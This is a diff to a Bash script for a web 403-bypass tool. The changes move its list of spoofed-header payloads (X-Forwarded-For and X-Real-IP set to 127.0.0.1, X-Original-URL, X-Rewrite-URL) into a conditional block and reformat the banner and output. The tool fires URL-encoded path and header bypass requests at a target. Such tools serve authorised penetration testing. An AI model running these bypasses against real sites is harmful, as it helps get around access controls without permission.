@@ -13,47 +13,23 @@ default_method="GET"
 method=""
 max_jobs=5  # Adjust this to change speed (parallel requests)
 headers=()
-test_mode="url"  # Default: url encode bypass only
+test_mode="url"
 
-# Header bypass array
-header_bypasses=(
-    "Client-IP: 127.0.0.1"
-    "X-Real-IP: 127.0.0.1"
-    "Redirect: 127.0.0.1"
-    "Referer: 127.0.0.1"
-    "X-Client-IP: 127.0.0.1"
-    "X-Custom-IP-Authorization: 127.0.0.1"
-    "X-Forwarded-By: 127.0.0.1"
-    "X-Forwarded-For: 127.0.0.1"
-    "X-Forwarded-Host: 127.0.0.1"
-    "X-Forwarded-Port: 80"
-    "X-True-IP: 127.0.0.1"
-    "X-Original-URL: ${pat}"
-    "X-Rewrite-URL: ${pat}"
-    "X-Original-Uri: ${pat}"
-    "X-Rewrite-Uri: ${pat}"
-    "X-Forwarded-Server: 127.0.0.1"
-    "X-Host: 127.0.0.1"
-    "X-Http-Host-Override: 127.0.0.1"
-    "X-Originating-IP: 127.0.0.1"
-    "X-Remote-Addr: 127.0.0.1"
-    "X-Remote-IP: 127.0.0.1"
-)
+
 
 banner() {
-
-        echo -e "$cyan$BOLD
-  ______                 ___   ____
- |  ____|               / _ \ |___ \
- | |__ ___  _   _ _ __ | | | |  __) |
- |  __/ _ \| | | | '__|| | | | |__ <
- | | | (_) | |_| | |   | |_| | ___) |
- |_|  \___/ \__,_|_|    \___/ |____/
-                          Bypass :D
-
-        author: @me_dheeraj
-       Enhanced By @mugh33ra$end"
-       echo ""
+    echo -e "${cyan}${BOLD}"
+    echo "  ______                 ___   ____  "
+    echo " |  ____|               / _ \ |___ \ "
+    echo " | |__ ___  _   _ _ __ | | | |  __) |"
+    echo " |  __/ _ \| | | | '__|| | | | |__ < "
+    echo " | | | (_) | |_| | |   | |_| | ___) |"
+    echo " |_|  \___/ \__,_|_|    \___/ |____/ "
+    echo "                          Bypass :D"
+    echo ""
+    echo "      Coded By @mugh33ra"
+    echo "         X: @mugh33ra"
+    echo -e "${end}"
 }
 
 help_usage() {
@@ -100,6 +76,33 @@ done
 method=${method:-$default_method}
 [[ ! -f "payloads.txt" ]] && { echo -e "${red}[!] payloads.txt not found${end}"; exit 1; }
 
+if [[ -n "$pat" ]]; then
+    header_bypasses=(
+        "Client-IP: 127.0.0.1"
+        "X-Real-IP: 127.0.0.1"
+        "Redirect: 127.0.0.1"
+        "Referer: 127.0.0.1"
+        "X-Client-IP: 127.0.0.1"
+        "X-Custom-IP-Authorization: 127.0.0.1"
+        "X-Forwarded-By: 127.0.0.1"
+        "X-Forwarded-For: 127.0.0.1"
+        "X-Forwarded-Host: 127.0.0.1"
+        "X-Forwarded-Port: 80"
+        "X-True-IP: 127.0.0.1"
+        "X-Original-URL: ${pat}"
+        "X-Rewrite-URL: ${pat}"
+        "X-Original-Uri: ${pat}"
+        "X-Rewrite-Uri: ${pat}"
+        "X-Forwarded-Server: 127.0.0.1"
+        "X-Host: 127.0.0.1"
+        "X-Http-Host-Override: 127.0.0.1"
+        "X-Originating-IP: 127.0.0.1"
+        "X-Remote-Addr: 127.0.0.1"
+        "X-Remote-IP: 127.0.0.1"
+    )
+fi
+
+
 run_check() {
     local p="$1"
     local current_p=$(echo "$p" | sed "s|\${pat}|$pat|g")
@@ -143,7 +146,6 @@ run_header_check() {
     local header="$1"
     local current_header=$(echo "$header" | sed "s|\${pat}|$pat|g")
 
-    # For X-Original-URL type headers, we need to remove the path from target
     if [[ "$current_header" =~ ^X-(Original|Rewrite)-(URL|Uri): ]]; then
         local test_url="${base_url}/"
         local header_value=$(echo "$current_header" | cut -d':' -f2- | sed 's/^ //')
@@ -187,9 +189,9 @@ run_header_check() {
 }
 
 encode_bypass() {
-    echo -e "${blue}----------------------${end}"
-    echo -e "${cyan}[+] URL Encode Bypass (Parallel)${end}"
-    echo -e "${blue}----------------------${end}"
+    echo -e "${blue}+--------------------------------+${end}"
+    echo -e "${cyan}|[+] URL Encode Bypass (Parallel)|${end}"
+    echo -e "${blue}+--------------------------------+${end}"
 
     set -f
     while IFS= read -r p || [[ -n "$p" ]]; do
@@ -207,9 +209,9 @@ encode_bypass() {
 }
 
 header_bypass() {
-    echo -e "${blue}----------------------${end}"
-    echo -e "${cyan}[+] Header Bypass (Parallel)${end}"
-    echo -e "${blue}----------------------${end}"
+    echo -e "${blue}+----------------------------+${end}"
+    echo -e "${cyan}|[+] Header Bypass (Parallel)|${end}"
+    echo -e "${blue}+----------------------------+${end}"
 
     for header in "${header_bypasses[@]}"; do
         [[ -z "$header" ]] && continue
@@ -225,12 +227,13 @@ header_bypass() {
 }
 
 main() {
+
     if [[ "$test_mode" == "url" ]]; then
-        banner        # Show banner here
-        encode_bypass # No banner inside this function
+        banner
+        encode_bypass
     elif [[ "$test_mode" == "all" ]]; then
-        banner        # Show banner once
-        encode_bypass # No banner inside
+        banner       
+        encode_bypass
         echo ""
         header_bypass
     fi
